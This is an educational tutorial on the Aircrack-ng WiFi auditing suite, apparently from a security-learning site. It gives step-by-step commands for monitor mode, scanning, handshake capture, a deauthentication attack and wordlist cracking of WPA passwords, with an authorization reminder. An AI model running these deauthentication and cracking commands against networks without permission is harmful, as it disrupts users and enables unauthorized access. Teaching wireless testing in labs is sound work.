
# Aircrack-ng

## What is Aircrack-ng

- **Aircrack-ng** is a popular **wireless network security auditing tool**.
- It is used to **analyze WiFi security, capture wireless packets, and crack weak WiFi passwords**.
- Aircrack-ng is widely used by:
  - penetration testers
  - cybersecurity professionals
  - ethical hackers
  - network administrators
  - CTF players

The Aircrack-ng suite contains multiple tools that help with:

- monitoring wireless networks
- capturing packets
- performing deauthentication attacks
- cracking WEP/WPA/WPA2 passwords

Because of its powerful wireless auditing capabilities, Aircrack-ng is considered a **core tool in wireless penetration testing**.

---

## Install Aircrack-ng

Aircrack-ng is usually pre-installed in **Kali Linux**.

To check installation:

```
aircrack-ng --help
```

If not installed:

```
sudo apt install aircrack-ng
```

---

## Aircrack-ng Tool Suite

Aircrack-ng includes several tools:

| Tool | Purpose |
|------|------|
| airmon-ng | Enable monitor mode |
| airodump-ng | Capture wireless packets |
| aireplay-ng | Perform packet injection attacks |
| aircrack-ng | Crack captured WiFi passwords |

These tools work together during wireless security testing.

---

## Enable Monitor Mode

To capture wireless packets, your WiFi card must be in **monitor mode**.

Start monitor mode:

```
sudo airmon-ng start wlan0
```

Example output:

```
monitor mode enabled on wlan0mon
```

Now the interface `wlan0mon` can monitor wireless traffic.

---

## Disable Monitor Mode

To return to normal mode:

```
sudo airmon-ng stop wlan0mon
```

---

## Scan Wireless Networks

Use **airodump-ng** to scan nearby WiFi networks.

```
sudo airodump-ng wlan0mon
```

This will display:

- available wireless networks
- BSSID (router MAC address)
- channel
- encryption type
- signal strength
- connected clients

Example:

```
BSSID              CH  ENC   ESSID
AA:BB:CC:DD:EE:FF  6   WPA2  MyWiFi
```

---

## Capture Packets from Target Network

To capture packets from a specific network:

```
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

Example:

```
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

This command:

- listens on channel 6
- captures packets from the target router
- saves them to a file called `capture`

Captured files will be saved as:

```
capture.cap
```

---

## Deauthentication Attack

A **deauthentication attack** forces connected devices to reconnect to the network.

This helps capture WPA handshakes.

```
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

Example:

```
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

This sends **10 deauthentication packets** to clients.

When devices reconnect, the **WPA handshake is captured**.

---

## Crack WiFi Password

Once the handshake is captured, use **aircrack-ng** to crack the password.

```
aircrack-ng -w <wordlist> -b <BSSID> capture.cap
```

Example:

```
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap
```

Explanation:

| Option | Meaning |
|------|------|
| -w | wordlist |
| -b | router MAC address |
| capture.cap | captured packets |

If the password exists in the wordlist, Aircrack-ng will display it.

---

## Check Captured Handshake

To confirm handshake capture:

Look in airodump-ng output for:

```
WPA handshake: AA:BB:CC:DD:EE:FF
```

This indicates the handshake has been successfully captured.

---

## Simple Workflow

Typical wireless penetration testing workflow:

### Step 1 — Enable Monitor Mode

```
sudo airmon-ng start wlan0
```

---

### Step 2 — Scan Networks

```
sudo airodump-ng wlan0mon
```

---

### Step 3 — Capture Target Traffic

```
sudo airodump-ng -c 6 --bssid <BSSID> -w capture wlan0mon
```

---

### Step 4 — Force Reconnection

```
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

---

### Step 5 — Crack Password

```
aircrack-ng -w rockyou.txt -b <BSSID> capture.cap
```

---

## Use Cases

Aircrack-ng is commonly used for:

- wireless security testing
- WiFi auditing
- WPA/WPA2 handshake analysis
- password strength testing
- penetration testing labs
- CTF challenges

---

## Best Practice

Wireless testing should only be performed on:

- your own networks
- authorized testing environments
- penetration testing labs

Safe practice platforms:

- TryHackMe
- Hack The Box
- cybersecurity labs

Never attempt to crack WiFi networks **without permission**.

---

## Summary

Aircrack-ng is one of the **most powerful wireless security auditing tools**.

It allows security professionals to:

- analyze wireless networks
- capture authentication handshakes
- test password strength
- audit WiFi security

Learning Aircrack-ng is essential for anyone studying **wireless security and ethical hacking**.


<div style="background: #1f3327; border-radius: 8px; padding: 18px; margin: 20px 0; border-left: 5px solid #3ddc84; color: #e6e6e6;">
<strong>✔ Learning Tip</strong><br><br>
Understand how operating systems manage files, memory, and processes. This knowledge helps in many security scenarios.
</div>